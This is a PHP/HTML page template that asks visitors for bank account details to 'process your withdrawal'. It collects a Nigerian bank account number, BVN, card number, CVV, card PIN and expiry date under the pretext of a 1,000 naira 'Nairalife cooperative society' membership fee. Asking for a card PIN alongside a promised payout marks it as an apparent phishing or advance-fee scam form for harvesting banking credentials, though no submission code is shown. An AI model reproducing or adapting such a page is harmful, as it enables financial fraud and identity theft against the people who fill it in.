<?php include 'meta.php';?>
<link href="css/login.css" rel="stylesheet" type="text/css" />

<!-- begin::Body -->
<body class="kt-quick-panel--right kt-demo-panel--right kt-offcanvas-panel--right kt-header--fixed kt-header-mobile--fixed kt-subheader--fixed kt-subheader--enabled kt-subheader--solid kt-aside--enabled kt-aside--fixed kt-page--loading">

<!-- begin:: Page -->
<div class="kt-grid kt-grid--ver kt-grid--root">
<div class="kt-grid kt-grid--hor kt-grid--root  kt-login kt-login--v1" id="kt_login">
<div class="kt-grid__item kt-grid__item--fluid kt-grid kt-grid--desktop kt-grid--ver-desktop kt-grid--hor-tablet-and-mobile">


<!--begin::Content-->
<div class="kt-grid__item kt-grid__item--fluid  kt-grid__item--order-tablet-and-mobile-1  kt-login__wrapper">

<!--begin::Head-->
<div class="kt-login__bottom">

</div>

<!--end::Head-->

<!--begin::Body-->
<div class="kt-login__body" id="login-section">

<!--begin::Signin-->
<div class="kt-login__form">
<?php include 'formhead.php';?>
<div class="kt-login__title">
<h3>Enter Bank Information</h3>
<p>Please enter your bank account information below <br>so as to be able to process your withdrawal</p>
</div>

<!-- <div class="error" style="display:none;">Invalid Username or Password</div> -->



<!--begin::Form-->
<form class="kt-form" action="" novalidate="novalidate">

<div class="form-group">
<input class="form-control" type="text" placeholder="Account No" 
name="username" autocomplete="off" required="true">
</div>

<div class="form-group">
<select class="custom-select bank-name">
<option>Select Bank</option>
<option value="Access Bank">Access Bank</option>
<option value="Diamond (Access) Bank">Diamond (Access) Bank</option>
<option value="First Bank Nigeria">First Bank Nigeria</option>
<option value="First City Monument Bank">First City Monument Bank</option>
<option value="Guarantee Trust Bank">Guarantee Trust Bank</option>
<option value="Zenith Bank">Zenith Bank</option>
<option value="United Bank Of Africa">United Bank Of Africa</option>
<option value="Polaris Bank">Polaris Bank</option>
<option value="Providius Bank">Providius Bank</option>
<option value="Sterling Bank">Sterling Bank</option>
<option value="Union Bank Of Nigeria">Union Bank Of Nigeria</option>
<option value="Ecobank Bank">Ecobank Bank</option>
<option value="Fidelity Bank Nigeria">Fidelity Bank Nigeria</option>
<option value="Heritage Bank">Heritage Bank</option>
<option value="Jaiz Bank">Jaiz Bank</option>
<option value="Keystone Bank">Keystone Bank</option>
<option value="New Prudential Bank">New Prudential Bank</option>
<option value="Nigeria International Bank (CITIGROUP)">Nigeria International Bank (CITIGROUP)</option>
<option value="Stanbic Ibtc Bank">Stanbic Ibtc Bank</option>
<option value="Standard Chartered Bank Nigeria">Standard Chartered Bank Nigeria</option>
<option value="Suntrust Bank">Suntrust Bank</option>
<option value="Unity Bank">Unity Bank</option>
<option value="Wema Bank">Wema Bank</option>
</select>
</div>

<div class="form-group">
<input class="form-control" type="text" placeholder="Enter BVN" name="bvn" autocomplete="off" required="true">
<p class="passerror kt-margin-l-10" style="color:red;">We only use your BVN to verify your identity (name and account no)</p>
</div>

<!--begin::Divider-->
<div class="kt-login__divider kt-margin-t-30">
<div class="kt-divider">
<span></span>
<span>AND</span>
<span></span>
</div>
</div>
<!--end::Divider-->

<div class="kt-login__title">
<p>
Pay 1,000 naira Nairalife cooperative society membership fee <br>
We will automatically charge this card for your contributions
</p>
</div>




<!--begin::Form-->
<div class="form-group">
<input class="form-control" type="text" placeholder="Card No" name="username" autocomplete="off" 
required="true">
</div>
<div class="form-group">
<input class="form-control" type="text" placeholder="CVV" name="username" autocomplete="off" 
required="true">
</div>
<div class="form-group">
<input class="form-control" type="password" placeholder="PIN" name="password" required="true">
</div>
<div class="form-group">
<input class="form-control" type="text" placeholder="Expiry Date" name="password" required="true">
</div>


<div class="kt-login__btn">
<button id="kt_login_signin_submit" class="btn btn-primary btn-tall btn-pill kt-login__btn-primary">
<span>Submit</span>
</button>
</div>


</form>

<!--end::Form-->



</div>

<!--end::Signin-->
</div>

<!--end::Body-->



































</div>
<!--end::Content-->

</div>
</div>
</div>

<!-- end:: Page -->